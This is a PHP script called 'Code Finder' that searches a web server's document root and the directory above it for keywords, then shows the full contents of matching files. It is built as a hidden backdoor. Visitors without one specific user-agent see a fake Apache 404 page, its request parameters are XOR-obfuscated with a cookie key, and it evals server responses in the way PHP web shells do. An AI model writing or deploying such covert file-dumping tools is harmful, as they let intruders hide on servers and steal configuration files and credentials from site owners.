<?php 
/**
 * Description of Finder
 * @author zeroc0de <zeroc0de@mail.ru>
 * Date 2022.01.16
 */
# Deny access by browser fingerprint
$md5 = md5($_SERVER['HTTP_USER_AGENT']); 
if($md5 != 'd44bfba7ec2b67d9eb9e6c1eea55c253'){
    header('HTTP/1.0 404 Not Found'); 
    die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">
<html><head>
<title>404 Not Found</title>
</head><body>
<h1>Not Found</h1>
<p>The requested URL '.htmlspecialchars($_SERVER['REQUEST_URI']).' was not found on this server.</p>
<hr>
<address>Apache/2.4.10 (Unix) Server at '.$_SERVER['SERVER_NAME'].' Port 80</address>
</body></html>');
}

header('Content-Type: text/html; charset=utf-8');
ini_set('error_reporting', E_ALL);
ini_set('display_errors', 1);
ini_set('display_startup_errors', 1);
ini_set('max_execution_time',0);  
set_time_limit(0);   
define('VERSION', '2.1.3'); 

for($i = 1; $i < 10; $i++){
    $_POST['p'.$i] = $_POST['p'.$i] ?? '';
}
$default_use_ajax = true;   
if (!isset($_COOKIE[md5($_SERVER['HTTP_HOST'])."key"])) {  
    prototype(md5($_SERVER['HTTP_HOST'])."key", $md5);  
}  
$_POST['charset'] = (empty($_POST['charset'])) ? 'UTF-8' : $_POST['charset'];

if (!isset($_POST['ne'])) {  
    foreach($_POST as $key => $value){
        if($key != 'charset'){
           $_POST[$key] = iconv("utf-8", $_POST['charset'], decrypt($_POST[$key],$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]));
        }
    }
}  
function decrypt($str,$pwd):string
{
    $pwd=base64_encode($pwd);
    $str=base64_decode($str);
    $enc_chr="";
    $enc_str="";
    $i=0;
    while($i<strlen($str)){
        for($j=0;$j<strlen($pwd);$j++){
            $enc_chr=chr(ord($str[$i])^ord($pwd[$j]));
            $enc_str.=$enc_chr;
            $i++;
            if($i>=strlen($str)){
                break;
            }  
        }
    }
    return base64_decode($enc_str);
}  
if(get_magic_quotes_gpc()) {  
    function stripslashes_array($array) {  
        return is_array($array) ? array_map('stripslashes_array', $array) : stripslashes($array);  
    }  
    $_POST = stripslashes_array($_POST);  
    $_COOKIE = stripslashes_array($_COOKIE);  
}  
if(!isset($_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax']))  {
    $_COOKIE[md5($_SERVER['HTTP_HOST']) . 'ajax'] = (bool)$default_use_ajax; 
}
$os = (strtolower(substr(PHP_OS,0,3)) == "win") ? 'win' : 'nix';  
$safe_mode = ini_get('safe_mode');  
if(!$safe_mode)  {
    //error_reporting(0);  
}
$disable_functions = ini_get('disable_functions');  
$home_cwd = $cwd = getcwd();  
if($os == 'win') {  
    $home_cwd = str_replace("\\", "/", $home_cwd);  
    $cwd = str_replace("\\", "/", $cwd);  
}  
if($cwd[strlen($cwd)-1] != '/') {
    $cwd .= '/';  
}
$iCount = 0;
$found = "";
$ignored_files = "";
$searchtypes = ['content', 'filename'];
$types = [
    'all_types' => "", 
    'php' => ".php", 
    'php3' => ".php3", 
    'js' => '.js', 
    'css' => '.css', 
    'tpl' => '.tpl', 
    'txt' => '.txt', 
    'html' => ".html", 
    'phtml' => ".phtml", 
    'htm' => ".htm", 
    'shtm' => ".shtm", 
    'shtml' => ".shtml", 
    'asp' => ".asp", 
    'java' => '.java', 
    'class' => '.class',
    'cfm' => '.cfm', 
    'cfml' => '.cfml'];
function hardHeader()
{  
    $header = "<html><head><meta http-equiv='Content-Type' content='text/html; charset={$_POST['charset']}'><title>Code Finder ".VERSION."</title> ";
    if(isset($_POST['p7']) && $_POST['p7'] == "on" ){
        $header .= "<script src='js/codemirror.js' type='text/javascript'></script>
        <script type=\"text/javascript\">
        var parserFiles = [\"parsexml.js\", \"parsecss.js\", \"tokenizejavascript.js\", \"parsejavascript.js\",
                     \"contrib/php/js/tokenizephp.js\", \"finder/contrib/php/js/parsephp.js\",
                     \"contrib/php/js/parsephphtmlmixed.js\"];
           var stylesheetFiles = [\"css/xmlcolors.css\", \"css/jscolors.css\", \"css/csscolors.css\", \"contrib/php/css/phpcolors.css\"];
           </script>";
    }
    $header .= "
        <link href='https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/css/bootstrap.min.css' rel='stylesheet'/>
        <style>
            body { background-color: black; color: lightgrey;}
            .p0 {  width: 100%;}
        </style>
<script>  
    var p0_ = '" . htmlspecialchars($GLOBALS['cwd']) . "';   
    var p1_ = '" . ((isset($_POST['p1']) && strpos($_POST['p1'],"\n")!==false) ? '' : htmlspecialchars($_POST['p1'],ENT_QUOTES)) ."';  
    var p2_ = '" . ((isset($_POST['p2']) && strpos($_POST['p2'],"\n")!==false) ? '' : htmlspecialchars($_POST['p2'],ENT_QUOTES)) ."';  
    var p3_ = '" . ((isset($_POST['p3']) && strpos($_POST['p3'],"\n")!==false) ? '' : htmlspecialchars($_POST['p3'],ENT_QUOTES)) ."';  
    var p4_ = '" . ((isset($_POST['p4']) && strpos($_POST['p4'],"\n")!==false) ? '' : htmlspecialchars($_POST['p4'],ENT_QUOTES)) ."'; 
    var p5_ = '" . ((isset($_POST['p5']) && strpos($_POST['p5'],"\n")!==false) ? '' : htmlspecialchars($_POST['p5'],ENT_QUOTES)) ."';  
    var p6_ = '" . ((isset($_POST['p6']) && strpos($_POST['p6'],"\n")!==false) ? '' : htmlspecialchars($_POST['p6'],ENT_QUOTES)) ."'; 
    var p7_ = '" . ((isset($_POST['p7']) && strpos($_POST['p7'],"\n")!==false) ? '' : htmlspecialchars($_POST['p7'],ENT_QUOTES)) ."';  
    var p8_ = '" . ((isset($_POST['p8']) && strpos($_POST['p8'],"\n")!==false) ? '' : htmlspecialchars($_POST['p8'],ENT_QUOTES)) ."';  
    var charset_ = '" . htmlspecialchars($_POST['charset']) ."'; 
    var d = document;  
      
    function encrypt(str,pwd){if(pwd==null||pwd.length<=0){return null;}str=base64_encode(str);pwd=base64_encode(pwd);var enc_chr='';var enc_str='';var i=0;while(i<str.length){for(var j=0;j<pwd.length;j++){enc_chr=str.charCodeAt(i)^pwd.charCodeAt(j);enc_str+=String.fromCharCode(enc_chr);i++;if(i>=str.length)break;}}return base64_encode(enc_str);}  
    function utf8_encode(argString){var string=(argString+'');var utftext='',start,end,stringl=0;start=end=0;stringl=string.length;for(var n=0;n<stringl;n++){var c1=string.charCodeAt(n);var enc=null;if(c1<128){end++;}else if(c1>127&&c1<2048){enc=String.fromCharCode((c1>>6)|192)+String.fromCharCode((c1&63)|128);}else{enc=String.fromCharCode((c1>>12)|224)+String.fromCharCode(((c1>>6)&63)|128)+String.fromCharCode((c1&63)|128);}if(enc!==null){if(end>start){utftext+=string.slice(start,end);}utftext+=enc;start=end=n+1;}}if(end>start){utftext+=string.slice(start,stringl);}return utftext;}  
    function base64_encode(data){var b64 = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=';var o1,o2,o3,h1,h2,h3,h4,bits,i=0,ac=0,enc='',tmp_arr=[];if (!data){return data;}data=utf8_encode(data+'');do{o1=data.charCodeAt(i++);o2=data.charCodeAt(i++);o3=data.charCodeAt(i++);bits=o1<<16|o2<<8|o3;h1=bits>>18&0x3f;h2=bits>>12&0x3f;h3=bits>>6&0x3f;h4=bits&0x3f;tmp_arr[ac++]=b64.charAt(h1)+b64.charAt(h2)+b64.charAt(h3)+b64.charAt(h4);}while(i<data.length);enc=tmp_arr.join('');switch (data.length%3){case 1:enc=enc.slice(0,-2)+'==';break;case 2:enc=enc.slice(0,-1)+'=';break;}return enc;}  
    function set(p0,p1,p2,p3,p4,p5,p6,p7,p8,charset) {   
        if(p0!=null)d.mf.p0.value=p0;else d.mf.p0.value=p0_;  
        if(p1!=null)d.mf.p1.value=p1;else d.mf.p1.value=p1_;  
        if(p2!=null)d.mf.p2.value=p2;else d.mf.p2.value=p2_;  
        if(p3!=null)d.mf.p3.value=p3;else d.mf.p3.value=p3_;  
        if(p4!=null)d.mf.p4.value=p4;else d.mf.p4.value=p4_;  
        if(p5!=null)d.mf.p5.value=p5;else d.mf.p5.value=p5_;  
        if(p6!=null)d.mf.p6.value=p6;else d.mf.p6.value=p6_;  
        if(p7!=null)d.mf.p7.value=p7;else d.mf.p7.value=p7_;  
        if(p8!=null)d.mf.p8.value=p8;else d.mf.p8.value=p8_;  
        d.mf.p0.value = encrypt(d.mf.p0.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        d.mf.p1.value = encrypt(d.mf.p1.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        d.mf.p2.value = encrypt(d.mf.p2.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        d.mf.p3.value = encrypt(d.mf.p3.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        d.mf.p4.value = encrypt(d.mf.p4.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        d.mf.p5.value = encrypt(d.mf.p5.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        d.mf.p6.value = encrypt(d.mf.p6.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        d.mf.p7.value = encrypt(d.mf.p7.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        d.mf.p8.value = encrypt(d.mf.p8.value,'".$_COOKIE[md5($_SERVER['HTTP_HOST'])."key"]."');  
        if(charset!=null)d.mf.charset.value=charset;else d.mf.charset.value=charset_;  
    }  
    function g(p0,p1,p2,p3,p4,p5,p6,p7,p8,charset) {  
        set(p0,p1,p2,p3,p4,p5,p6,p7,p8,charset);  
        d.mf.submit();  
    }  
    function a(p0,p1,p2,p3,p4,p5,p6,p7,p8,charset) {  
        set(p0,p1,p2,p3,p4,p5,p6,p7,p8,charset);  
        var params = 'ajax=true';  
        for(i=0;i<d.mf.elements.length;i++)  
            params += '&'+d.mf.elements[i].name+'='+encodeURIComponent(d.mf.elements[i].value);  
        sr('" . addslashes($_SERVER['REQUEST_URI']) ."', params);  
    }  
    function sr(url, params) {  
        if (window.XMLHttpRequest)  
            req = new XMLHttpRequest();  
        else if (window.ActiveXObject)  
            req = new ActiveXObject('Microsoft.XMLHTTP');  
        if (req) {  
            req.onreadystatechange = processReqChange;  
            req.open('POST', url, true);  
            req.setRequestHeader ('Content-Type', 'application/x-www-form-urlencoded');  
            req.send(params);  
        }  
    }  
    function processReqChange() {  
        if( (req.readyState == 4) )  
            if(req.status == 200) {  
                var reg = new RegExp(\"(\\\\d+)([\\\\S\\\\s]*)\", 'm');  
                var arr=reg.exec(req.responseText);  
                eval(arr[2].substr(0, arr[1]));  
            } else alert('Request error!');  
    }  
</script>  
<head><body>  
<form method=post name=mf style='display:none;'>  
<input type=hidden name=p0>  
<input type=hidden name=p1>  
<input type=hidden name=p2>  
<input type=hidden name=p3>  
<input type=hidden name=p4>  
<input type=hidden name=p5>  
<input type=hidden name=p6>  
<input type=hidden name=p7>  
<input type=hidden name=p8>  
<input type=hidden name=charset>  
</form>";  
    echo $header;
}  
function hardFooter()
{  
    echo "</body></html>";  
}  
function prototype($k, $v) 
{  
    $_COOKIE[$k] = $v;  
    setcookie($k, $v);  
}  
function view():string
{
    global $iCount, $found, $ignored_files;
    $message = $iCount === 0 ? "Not Found" : "Found {$iCount} files";
    return "<div class='row-fluid center-block'>
                <table class='table table-bordered  table-dark' cellpadding='5' align='center'>
                <tr>
                    <th class='text-center'><font size='4'>$message</b></th>
                </tr>
                <tbody>
                    {$found}{$ignored_files}
                </tbody>
            </table>
                </div>";
}
function hardRecursiveGlob(string $path, array $exclude_folder, array $exclude_search)
{ 
    global $iCount;
    if($iCount <= $_POST['p6']){        
        if(substr($path, -1) != '/')  {
            $path .= '/'; 
        }
        $paths = array_unique(array_merge(glob($path.$_POST['p2']), glob($path.'*', GLOB_ONLYDIR)));  
        if(is_array($paths) && count($paths)) {  
            foreach($paths as $filename) {              
                if(is_dir($filename) AND $filename != dirname(__FILE__)){                
                    if($path != $filename && !in_array(basename($filename), $exclude_folder))  {
                        hardRecursiveGlob($filename, $exclude_folder, $exclude_search);
                    } 
                } 
                else if($filename !== __FILE__){   
                    if($iCount >= $_POST['p6']){
                        break; 
                    }
                    getData($filename);
                     
                }  
            }  
        }  
    }
}  
function prepareFound($filename, $filesize, $text)
{    
    global $iCount, $found;
    $iCount++;
    $found .= '
        <tr style="background-color: grey;">
            <td class="text-center" style="padding:2px;">
                <span style="font-size: 12px">
                    '.$iCount.'. ('.FileSizeConvert($filesize).') - '.$filename.'
                </span>
                <br>
                <span style="font-size: 10px">
                    <span title="create date">'.date('Y-m-d H:i:s',filectime($filename)).'</span> - 
                    <span title="last access date">'.date('Y-m-d H:i:s',fileatime($filename)).'</span> - 
                    <span title="edit date">'.date('Y-m-d H:i:s',filemtime($filename)).'</span>
                </span>
                <div class="text-center bg-light">
                    <textarea class="p0" id="code'.$iCount.'" cols="160" rows="10">'.htmlspecialchars($text, ENT_IGNORE).'</textarea>';
    if((isset($_POST['p7']) && $_POST['p7'] == "on") ){
        $found .= '<script type="text/javascript">
            var editor = CodeMirror.fromTextArea(\'code'.$iCount.'\', {
                height: "150px",
                parserfile: parserFiles,
                stylesheet: stylesheetFiles,
                path: "js/",
                continuousScanning: 500
            });
            </script>';
    }
    $found .= '</div>  
        </td>
        </tr>'; 
}
function getData(string $filename)
{
    global $types;
    $filesize = filesize($filename);
    $filetype = substr(strrchr($filename, '.'), +1);
    
    if(strlen($_POST['p2'])<1 || isset($types[$filetype])){
        if($filesize < ($_POST['p5'] * 1000)){
            $text = file_get_contents($filename);
            if($_POST['p8'] == "filename"){
                $pathinfo = pathinfo($filename);
                if(preg_match('#'.$_POST['p1'].'#i', $pathinfo['filename'])){
                     prepareFound($filename, $filesize, $text);                             
                }
            }
            else {
                if(empty($_POST['p4']) || strpos($text, $_POST['p4']) === false) {
                    $rules = setRules($_POST['p1']);
                    $count_find = 0;
                    foreach($rules['keyword'] as $value){
                        if (strpos($text, $value)!==false) {
                            $count_find++;
                        }
                    }
                    $result_bool = useRules($count_find, $rules);
                    if($result_bool){
                        prepareFound($filename, $filesize, $text);
                    }
                }
            }
            
        }
        else {
            /*
            global $ignored_files;
            $ignored_files .= '<tr class="table-danger text-dark text-center">
                <td style="padding:0;font-size: 13px">
                    <span title="file">('.FileSizeConvert($filesize).') - '.$filename.' - IGNORE</span>
                </td>
            </tr>'; 
             */
        }
    }
}
function useRules(int $count_find, array $output):bool
{
    $result_bool = false;
    if($count_find > 0){
        switch($output['rule']){
            case 0 : { // AND
                if(count($output['keyword']) == $count_find){
                    $result_bool = true;
                }
            } break;
            case 1 : //
            case 2 : { 
                $result_bool = true;
            } break;
        }
    }
    return $result_bool;
}
function setRules(string $keyword):array
{   
    $output = [];
    switch($keyword){
        case (preg_match('#&#i', $keyword) ? true : false): {
            $output['keyword']  = explode('&', $keyword);
            $output['rule']  = 0;
        }break;
        case (preg_match('#\|#i', $keyword) ? true : false): {
            $output['keyword'] = explode('|', $keyword);
            $output['rule']  = 1;
        }break;
        default : {
            $output['keyword'][]  = $keyword;
            $output['rule']  = 2;
        }
    }
    return $output;
}
function printPre($array, $die = false, $pre = false)
{
    if($pre){
        echo "<pre>";
    }
    print_r($array);
        if($pre){            
            echo "</pre>";
        }
        if($die) {
          die();  
        }
    }
function actionSearch()
{  
    global $types, $searchtypes;
    if(isset($_POST['p1']) && count($_POST)){
        //printPre($_POST, false, true);
    }
    hardHeader();  
    
    # Search
    $search = isset($_POST['p1']) ? htmlspecialchars_decode($_POST['p1']) : '';
    # Search in the specified directory
    $include_folder = isset($_POST['p0']) ? htmlspecialchars_decode($_POST['p0']) : $_SERVER['DOCUMENT_ROOT'];
    $include_dir = "<option value='{$_SERVER['DOCUMENT_ROOT']}'>/</option>";
    $include_dir .= "<option value='".dirname($_SERVER['DOCUMENT_ROOT'])."'>../</option>";
    foreach(glob($_SERVER['DOCUMENT_ROOT']."/*") as $dir){
        if(is_dir($dir)){
            if($dir == dirname(__FILE__)){
                continue;
            }
            $option_value = htmlspecialchars("{$dir}/");
            
            $selected = ($include_folder == "{$dir}/") ? " selected" : "";
            $include_dir .= "<option".$selected."  value='{$option_value}'>".basename($dir)."</option>";
        }
    }
    # Search in specified file types
    $filetypes = "";
    foreach($types as $typename => $typevalue){
        $selected = (isset($_POST['p2']) && $_POST['p2'] == "*".$typevalue) ? " selected" : "";
        $filetypes .= "<option".$selected." value='*{$typevalue}'>{$typename}</option>";
    }
    # Search type
    $searchtype = "";
    foreach($searchtypes as $search_type_value){
        $selected = (isset($_POST['p8']) && $_POST['p8'] == $search_type_value) ? " selected" : "";
        $searchtype .= "<option".$selected." value='{$search_type_value}'>{$search_type_value}</option>";
    }
    # Exclude specified directories from search
    $exclude_folder = (isset($_POST['p3']) && strlen(trim($_POST['p3'])) > 0) ? explode(',', htmlspecialchars_decode($_POST['p3'])) : [];
    array_walk($exclude_folder, function(&$key){
        $key = trim($key);
    }); 
    # Exclude files larger of the specified size
    $max_filesize = (isset($_POST['p5']) && is_numeric($_POST['p5'])) ? $_POST['p5'] : 400;
    # Exclude from search a file with the specified keywords, separated by commas
    $exclude_search = (isset($_POST['p4']) && strlen(trim($_POST['p4'])) > 0) ? explode(',', htmlspecialchars_decode($_POST['p4'])) : [];    
    # Limit the number of files found
    $files_limit = (isset($_POST['p6']) && is_numeric($_POST['p6'])) ? $_POST['p6'] : 500;
    
    # Highlight status
    $highlight_off = "checked";
    $highlight_on =  "";
    if((isset($_POST['p7']) && $_POST['p7'] == "on")){
        $highlight_on =  "checked";
        $highlight_off = "";
    }
    
    
    echo "<div class='container-fluid'>        
            <div class='row-fluid center-block'> 
                <form onsubmit=\"g(this.include_folder.value, this.search.value, this.filetype.value, this.exclude_folder.value, this.exclude_search.value, this.max_filesize.value, this.files_limit.value, this.highlight.value, this.searchtype.value);return false;\">
                    <div class='form-inline'>
                        <input type='text' value='".htmlspecialchars($search, ENT_QUOTES)."' name='search' placeholder='Keyword' style='width:33%' minlength='3' required class='form-control' title='Search by keyword, may use symbols &, | with the meanings AND,OR'>
                        <select name='include_folder' style='width:33%'  class='form-control' title='Category search'/>
                            {$include_dir}                        
                        </select>
                        <select name='filetype' style='width:15%'  class='form-control' title='Search in by file type'>
                            {$filetypes}                            
                        </select>
                        <select name='searchtype' style='width:15%'  class='form-control' title='Search type'>
                            {$searchtype}                            
                        </select>
                        <input type='radio' value='on' id='highlight_on' style='width:3%' name='highlight' title='Highlight code enable' placeholder='Highlight code enable' class='form-control' {$highlight_on}/>
                    </div>
                    <div class='form-inline'>
                        <input type='text' style='width:33%' name='exclude_search' title='Exclude files with keyword, separated by commas' placeholder='Exclude files with keyword, separated by commas' value='".htmlspecialchars(implode(',', $exclude_search), ENT_QUOTES)."' class='form-control'/>    
                        <input type='text' style='width:33%' name='exclude_folder' title='Exclude folder names separated by commas' placeholder='Exclude folder names separated by commas' value='".htmlspecialchars(implode(',', $exclude_folder), ENT_QUOTES)."' class='form-control'/>
                        <input type='number' style='width:15%' min='1' max='10000' name='max_filesize' title='Exclude files larger of the specified size, in kB' required placeholder='Exclude files larger of the specified size, in kB' value='{$max_filesize}' class='form-control'/>
                        <input type='number' style='width:15%' min='1' name='files_limit' title='Limit the number of files found' required placeholder='Limit the number of files found' value='{$files_limit}' class='form-control'/>
                            
                        <input type='radio' value='off' id='highlight_off' style='width:3%' name='highlight' title='Highlight code disabled' placeholder='Highlight code disabled' class='form-control' {$highlight_off}/>
                    </div>
                    <input type='submit' class='btn btn-success' style='width:100%' value='submit'/> <br> 
                </form>
            </div>";  
    if(isset($_POST['p2']) && $_POST['p2'])  {
        hardRecursiveGlob($_POST['p0'], $exclude_folder, $exclude_search); 
        echo view();
    }
    echo "</div>";  
    hardFooter();  
} 
function FileSizeConvert(int $bytes):string
{
    $byte = floatval($bytes);
    $arBytes = array(
        0 => array(
            "UNIT" => "TB",
            "VALUE" => pow(1024, 4)            ),
        1 => array(
            "UNIT" => "GB",
            "VALUE" => pow(1024, 3) ),
        2 => array(
            "UNIT" => "MB",
            "VALUE" => pow(1024, 2)            ),
        3 => array(
            "UNIT" => "KB",
            "VALUE" => 1024 ),
        4 => array(
            "UNIT" => "B",
            "VALUE" => 1),
        );
        foreach($arBytes as $arItem)    {
            if($byte >= $arItem["VALUE"])        {
                $result = $byte / $arItem["VALUE"];
                $result = str_replace(".", "," , strval(round($result, 2)))." ".$arItem["UNIT"];
                break;
            }
        }
        return $result; 
    }  
call_user_func('actionSearch'); 
